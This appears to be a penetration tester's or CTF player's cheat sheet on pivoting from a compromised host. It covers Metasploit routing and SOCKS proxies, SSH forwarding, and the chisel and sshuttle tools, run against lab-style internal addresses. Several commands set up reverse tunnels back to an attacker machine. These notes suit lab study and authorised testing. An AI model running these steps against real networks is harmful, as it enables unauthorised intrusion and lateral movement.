# using metasploit

```shell
1) using autoroute
	# inside session meterpreter
	# set route
	- run autoroute -s 10.10.1.1 -n 10.10.1.255 
	- run autoroute -p # active routes
	
	# -> now you can scan all internal network by various modules 
	- use scanner/portscan/tcp # for portscan 
	- use post/windows/gather/arp_scanner # for arp scan or enumerating other devices 

2) using socks_proxy 
	# for outside intigration with tool
	- use auxiliary/server/socks_proxy
	- set srvport 9050
	- set version 4a
	- run -j
	# now you can use  proxychains nmap 10.10.4.2 

3) using portfwd
	# for port forward [inside meterpreter]
	- portfwd add -l 1234 -p 80 -r 10.10.4.2

```

---
# using ssh tunneling / port forwarding  
## 🔁 1) *Forward Connections*
  There are `two main` methods: 
  ### ➤ Port Forwarding
```shell
# Forward a local port to a target host's port via a compromised server
# Syntax: ssh -L [local_port]:[target_ip]:[target_port] [user]@[jump_host] -i [key_file] -fN
ssh -L 8080:10.200.85.150:80 root@10.200.85.200 -i id_rsa -fN  
```
### ➤ Proxy Creation
```shell
# Create a dynamic proxy (SOCKS proxy)
# Syntax: ssh -D [local_port] [user]@[jump_host] -i [key_file] -fN
ssh -D 1337 root@10.200.85.200 -i id_rsa -fN
```

## 🔄 2) *Reverse Connections*
- possible with the SSH client.
- preferable if you have a shell on the compromised server, but not SSH access)
``` shell
# initial steps

# ssh-keygen
# copy content of public key file and edit on .ssh/authorized_keys
# on first line add this
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty

- sudo systemctl status|start ssh

# Big No No - transfer private key to target host
ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN

```

---
# using other tools 
tools like chisel ; ptunnel ; proxytunnel ; sshuttle 
1) chisel
``` shell
1) remort port forwarding...
	# chisel server (attacker)
	- chisel server -p 1234 --reverse
	
	# chisel client (compromise server)
	- chisel client 10.50.86.21:1234 R:8888:10.200.85.150:80
	# R:8888:pivoted_internal_network_ip:80 

2) local port forwarding
	# chisel server (compromise machine)
	- chisel server -p 1234 
	
	# chisel client (attacker machine)
	- chisel client 10.200.85.200:1234 8888:10.200.85.150:80
```

2) sshuttle 
- simulate vpn ,  allowing us to route our traffic through the proxy    without the use of proxychains
``` shell
## basic use

# sshuttle -r username@address subnet
- sshuttle -r root@10.200.85.200 10.200.85.0/24 

## if password not abailable bypass with --ssh-cmd switch and use ssh keys
- sshuttle -r root@10.200.85.200 10.200.85.0/24 --ssh-cmd 'ssh -i 10.200.85.200/id_rsa'

### you can use -N for determine subnet automacally
### -x ip for exclude the compromised server from the subnet range
```

---
